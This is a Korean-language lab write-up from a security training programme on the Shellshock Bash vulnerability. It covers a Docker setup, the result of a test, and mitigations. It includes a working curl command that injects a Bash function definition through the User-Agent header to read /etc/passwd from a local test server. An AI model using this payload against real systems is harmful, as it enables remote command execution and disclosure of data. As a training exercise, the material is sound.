# Shellshock (CVE-2014-6271) 취약점 실습

화이트햇 스쿨 3기 - 박상경 (@bsk2002)

## 요약
Shellshock은 Bash의 환경 변수 처리 과정에서 발생하는 취약점입니다.
특수하게 조작된 환경 변수를 통해 Bash 명령어가 실행될 수 있어, 원격 코드 실행(RCE)로 이어질 수 있습니다.

웹 서버가 CGI 스크립트를 통해 Bash를 호출하는 경우, 공격자가 HTTP 헤더를 조작하여 서버에서 임의 명령어를 실행할 수 있습니다.

## 환경 구성 및 실행
- `docker-compose.yml`과 `Dockerfile`을 작성하여 직접 환경을 구성했습니다.
- `docker-compose up -d` 명령어로 컨테이너를 빌드 및 실행합니다.
- 브라우저에서 `http://localhost:8080/cgi-bin/safe.cgi` 접속 시 `This is a safe CGI script.` 문구가 출력되면 정상적으로 환경이 구축된 것입니다.
- 취약점 테스트:
  `curl -A '() { :;}; echo; echo; /bin/cat /etc/passwd' http://localhost:8080/cgi-bin/victim.cgi`
  위 명령어를 실행했을 때 /etc/passwd 파일 내용이 출력되면 취약점이 존재함을 확인할 수 있습니다.
※ 별도의 poc.py 파일은 필요하지 않습니다. curl 명령어만으로 공격이 가능합니다.

## 결과

- `This is a safe CGI script.` 문구가 정상 출력되었습니다.
- 이후 공격용 curl 명령어를 통해 서버의 `/etc/passwd` 파일을 읽을 수 있었습니다.
  ![image](https://github.com/user-attachments/assets/15dc099f-c1d9-49c5-b214-fe3a2e094949)
  ![스크린샷 2025-04-27 17 13 19](https://github.com/user-attachments/assets/5852fd04-e197-4673-967c-16a59e0525c9)

## 정리
Shellshock 취약점은 Bash를 사용하는 서버에서 환경 변수만 조작해도 코드 실행이 가능한 심각한 문제입니다.
공격자는 시스템 명령어를 자유롭게 실행할 수 있어 서버 전체를 장악할 수 있습니다.

대응 방안:
- Bash를 최신 버전으로 패치합니다.
- 외부 입력을 직접 Bash로 넘기는 경우를 최대한 피합니다.
- 필요 없는 CGI 기능은 비활성화합니다.
